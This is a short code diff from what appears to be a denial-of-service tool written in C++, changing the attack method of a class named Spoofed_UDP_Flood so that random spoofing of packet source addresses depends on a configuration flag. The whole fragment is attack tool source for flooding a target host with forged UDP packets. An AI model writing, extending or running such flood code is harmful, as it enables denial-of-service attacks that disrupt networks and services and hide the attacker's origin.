@@ -36,8 +36,12 @@ void Spoofed_UDP_Flood::attack(const int *id) {
             }else{
                 bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
             }
-            if((ip->saddr = inet_addr(Randomizer::randomIP().c_str())) == -1){
-                continue;
+            if(conf->RandomizeSource){
+                if((ip->saddr = inet_addr(Randomizer::randomIP().c_str())) == -1){
+                    continue;
+                }
+            }else{
+                ip->saddr = 0;
             }
 
             init_headers(ip, udp, buf);
